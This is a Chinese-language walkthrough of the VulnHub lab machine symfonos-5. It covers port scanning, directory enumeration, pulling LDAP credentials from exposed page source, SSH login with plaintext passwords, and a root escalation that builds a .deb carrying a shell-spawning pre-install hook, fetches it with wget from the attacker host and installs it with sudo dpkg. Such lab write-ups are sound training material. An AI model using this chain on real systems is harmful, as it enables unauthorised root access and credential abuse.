# symfonos-5

## 环境

虚拟机平台：VMware Workstation Pro

攻击机：Kali（IP：192.168.253.136）

靶机：symfonos-4（IP：192.168.253.141）

下载：https://www.vulnhub.com/entry/symfonos-5,415/

## Let's go

```
nmap -A 192.168.253.141
```

![](./img/symfonos5-01.png)

> **浏览网页无发现，进行枚举**

```
dirsearch -u http://192.168.253.141 -E
```

![](./img/symfonos5-02.png)

![](./img/symfonos5-03.png)

> **尝试直接访问 home.php 发现主页的源代码**

![](./img/symfonos5-04.png)

![](./img/symfonos5-05.png)

> **得到 ldap 的用户名和密码，使用nmap进行脚本扫描**

![](./img/symfonos5-06.png)

```
nmap -p 389 --script ldap-search --script-args "ldap.password='qMDdyZh3cT6eeAWD',ldap.username='cn=admin,dc=symfonos,dc=local'" 192.168.253.141
```

![](./img/symfonos5-07.png)

```
ssh zeus@192.168.253.141
password:cetkKf4wCuHC9FET
```

![](./img/symfonos5-08.png)

```
sudo -l
```

![](./img/symfonos5-09.png)

> **参考这里 https://gtfobins.github.io/gtfobins/dpkg/**

```
TF=$(mktemp -d)
echo 'exec /bin/sh' > $TF/x.sh
fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
```

![](./img/symfonos5-10.png)

```
wget http://192.168.253.136/x_1.0_all.deb
sudo dpkg -i x_1.0_all.deb
```

![](./img/symfonos5-11.png)

```
cd
cat proof.txt
```

![](./img/symfonos5-12.png)